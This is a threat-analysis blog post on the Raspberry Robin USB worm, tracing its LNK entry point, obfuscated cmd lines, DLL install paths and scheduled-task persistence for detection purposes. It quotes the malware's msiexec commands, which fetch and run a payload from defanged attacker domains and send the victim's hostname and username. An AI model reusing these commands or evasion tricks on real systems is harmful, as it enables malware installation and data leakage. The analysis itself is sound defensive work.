            <h1 class="blog-single-title">Suspicious DLL: Raspberry robin?</h1>

            <div class="social-share">
    <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Ftehtris.com%2Fen%2Fblog%2Fsuspicious-dll-raspberry-robin%2F&t=Suspicious+DLL%3A+Raspberry+robin%3F" title="Share on Facebook" class="social-share-item facebook" target="_blank">

<p>TEHTRIS threat analyst team was following a new threat that raises lots of questions.<br>Seeing the recent analysis published by RedCanary[1], we decided to publish our analysis to continue what they started: raising awareness about this threat and bringing visibility to this malware.</p>



<p>We decided to keep the name Raspberry Robin to facilitate security researcher job.</p>



<p>Most of our sample date from April/May 2022.</p>



<p>We don’t know yet if the threat is targeted toward some compagnies/sectors but in most cases, the industrial and service provider sectors were impacted. Moreover, it is recommended for everyone to monitor that threat.</p>



<p>This threat seems to propagate like a worm. We haven’t seen proof of human activity at any stage during the analysis (for instance, searching for credential, data, lateral movement).</p>



<p>In every case, the entry point was always an infected USB key with a LNK file inside.</p>



<nav class="wp-block-stackable-table-of-contents stk-block-table-of-contents stk-block stk-9802fd2" data-block-id="9802fd2"><ul class="stk-table-of-contents__table has-text-color has-tehtris-pink-color"><li><a href="#initial-access">Initial Access</a></li><li><a href="#first-execution-cmd">First execution: CMD</a></li><li><a href="#explorer-msi">Explorer &amp; MSI</a></li><li><a href="#dll">DLL</a></li><li><a href="#conclusion">Conclusion</a></li><li><a href="#ioc">IOC</a></li></ul></nav>



<h2 class="wp-block-heading" id="initial-access">Initial Access</h2>



<p>LNK files are “shortcuts” for applications, the one present on the Desktop for instance, however, it is also possible to store entire command line (powershell, cmd, …).</p>



<p>The attack starts with a LNK file being executed from a USB drive. The naming convention of the LNK file itself seems to mimic the USB drive name as seen in several cases:</p>



<ul class="wp-block-list">
<li><strong>E:Lexar.lnk</strong></li>



<li><strong>D:KINGSTON.lnk</strong></li>
</ul>



<p>We don’t know yet if the initial click results in human activity or a vulnerability or autorun like functionalities.</p>



<p>We don’t know yet how the LNK got on the USB key in the first place.<br>We don’t know yet if the USB key are purposely built to target some companies (USB keys dropped in a company parking lot) or if it comes from personal employees’ USB Key which were already infected.</p>



<p>We haven’t had the chance to put our hands on an infected USB key. We do suspect that other files may exist in the USB key, but we do not have the proof by now.</p>



<p><strong>Forensic:</strong> It’s possible to find traces of the LNK file in UserAssist keys of the user who executed it.</p>



<h2 class="wp-block-heading" id="first-execution-cmd">First execution: CMD</h2>



<p>For a majority of our samples, a command involving cmd.exe is executed. The command line is filled with spacing symbols (more that 200): ^I (tabulations), $ (new line) and regular space. For the sake of visibility, they have been replaced with […].</p>



<p>Below, there are several examples as seen on several cases. Only one of those command lines is executed in each case, but we deemed important to show the variety of them.</p>



<ul class="wp-block-list">
<li><strong>&#8220;C:WindowsSystem32cmd.exe&#8221;[…]/V/R cMd&lt;HiVE.LNk:sb</strong></li>



<li><strong>&#8220;C:WindowsSystem32cmd.exe&#8221;[…]/V/R !COmsPEc!&lt;qjM.cHK</strong></li>



<li><strong>&#8220;C:WindowsSystem32cmd.exe&#8221; /r[…]cMd&lt;qJm.cHK</strong></li>
</ul>



<p>The aim of the command seems to execute the command included in the file after the “&lt;”.</p>



<p>We haven’t got our hand on one of those files, but we know:</p>



<ul class="wp-block-list">
<li>/R is the same as /C, probably to evade detection</li>



<li>/V is for allowing the usage of “!” instead of “%” for environment variable. !comspec! is an environment variable pointing to cmd.exe full path (C:Windowssystem32cmd.exe for instance).</li>



<li>In some cases, there is a probable evidence of ADS (Alternate Data Stream) usage as could be seen in the first example after the “:”, probably to conceal the malicious content. ADS is a feature of NTFS filesystems only.</li>



<li>The usage of lower/upper case letter is aimed at hindering detections.</li>
</ul>



<p>Those command lines spawn two processes: an Explorer and a MSIExec.</p>



<h2 class="wp-block-heading" id="explorer-msi">Explorer &amp; MSI</h2>



<p>Example of the Explorer :<strong><br></strong></p>



<pre class="wp-block-code"><code>exPLoREr KINgSTON
ExplOrEr "VICTOR"</code></pre>



<p>For now, we can only guess on the goal of the explorer. Given the meddling of lower/upper cases, it’s probably a voluntary action from the attacker. The command line opens the file explorer in the drive, so it’s maybe to show the end-user that something happened: even if it’s a human name, we guess it’s the USB KEY name.</p>



<p>Example of the MSIExec :</p>



<pre class="wp-block-code"><code>MsIExEc -Q /I "HttP://jZM&#91;.]pw:8080/&lt;REMOVED STRING>/&lt;HOSTNAME>?&lt;USERNAME>"
MSiEXEC /Q/I "hTtp://b9&#91;.]pm:8080/&lt;REMOVED STRING>/&lt;HOSTNAME>?&lt;USERNAME>"
MsieXec -Q-i "hTtp://0Dz&#91;.]me:8080/&lt;REMOVED STRING>/&lt;HOSTNAME>?&lt;USERNAME> "</code></pre>



<p>&lt; REMOVED STRING &gt; looks like S1TOapDC73i, different for each command line.</p>



<p>As seen previously, upper/lower case character are mixing, but the way the options are provided changes too because / and – are both acceptable for parameter. For instance:</p>



<pre class="wp-block-code"><code>MsIExEc -Q-i
MsieXec /Q/I
MSiEXEC -Q /I</code></pre>



<p>With this command, msiexec can retrieve a payload on the Internet and execute it. It results in the following DLL installation.</p>



<h2 class="wp-block-heading" id="dll">DLL</h2>



<p>The next stage takes the form of a DLL.<br>As for now, we have seen that each infection has its own instance of the DLL. Our hypothesis is that a new binary is generated for each infection.</p>



<p>The DLL install itself in one of the following directories:</p>



<pre class="wp-block-code"><code>C:\ProgramData\*
C:\Users\&lt;user>\AppData\Local\Temp\*
C:\Program Files (x86)\Common Files\*
C:\Users\&lt;user>\AppData\Local\*
C:\Program Files (x86)\*</code></pre>



<p>The final DLL is imbricated in 2 level of directory, for instance:</p>



<pre class="wp-block-code"><code>c:\program files (x86)\common files\&lt;STRING1>\&lt;STRING2>\&lt;STRING3>.dll
c:\users\&lt;user>\appdata\local\&lt;STRING1>\&lt;STRING2>\&lt;STRING3>.dll
C:\ProgramData\&lt;STRING1>\&lt;STRING2>\&lt;STRING3>.dll</code></pre>



<p>&lt; STRING 1&gt; looks like a probable but random program name, such as KeyInfo, TermDriver, …</p>



<p>&lt; STRING2 &gt; looks more random, but still probable for an internal program directory like UdrateTask, Assonists, …</p>



<p>&lt; STRING3 &gt; looks like random string, with [a-zA-Z0-9] separated with _ like tno8trami_topino.dll, AKAWAhopl_NET87.dll or momr_knte8_54.dll.</p>



<p>We observed that in the first level directory (STRING1), there were files from the hard drive (dll, bin, pptx, exe, …) that were being copied here. As the creation time and access time were identical (even if it’s possible that they have been modified), we suppose it’s to mimic a normal program repository, with all kinds of binaries, because a directory in ProgramDataProgram Files with nothing inside is suspicious.</p>



<p>All the previous steps were conducted as the user responsible for plugging the USB Key and it’s the same for this DLL.</p>



<p>As seen previously, the DLL seems to follow a naming pattern, but it’s not a reliable means of detection because divergences have been seen.</p>



<p>The DLL is launched with a rundll32 in most observed cases (but regasm has been seen used in a minority of cases)</p>



<pre class="wp-block-code"><code>C:\WINDOWS\SysWOW64\RUNDLL32.EXE C:\ProgramData\&lt;STRING1>\&lt;STRING2>\&lt;STRING3>.dll,&lt;STRING4>

C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe /silent /u “C:\Program Files (x86)\Common Files\&lt;STRING1>\&lt;STRING2>\&lt;STRING3>.dll”</code></pre>



<p>&lt; STRING4 &gt; is the DLL entry point, it looks like &lt; STRING3 &gt;, a random string, with [a-zA-Z0-9] separated with _.</p>



<p>The DLL is launched by a schedule task:</p>



<pre class="wp-block-code"><code>\Microsoft\Windows\RemoteApp and Desktop Connections Update\&lt;STRING5></code></pre>



<p>There are some legit scheduled tasks that start the same up to “update”, however &lt; STRING5 &gt; is either a random string with [a-zA-Z] or a made up program name with like System.Windows.Orez.</p>



<p>We don’t know yet the method used to add the scheduled task.</p>



<h2 class="wp-block-heading" id="conclusion">Conclusion</h2>



<p>We don’t have information about the goal or the target of the attacker behind this attack, however the threat has been detected in a wide number of countries from all around the world. We strongly advise everyone to search for those IoCs (domain names, scheduled tasks, command line matching the one observed, …) and remediate the contaminated computers as soon as possible.</p>



<p>We will update the article should we have any new element.</p>
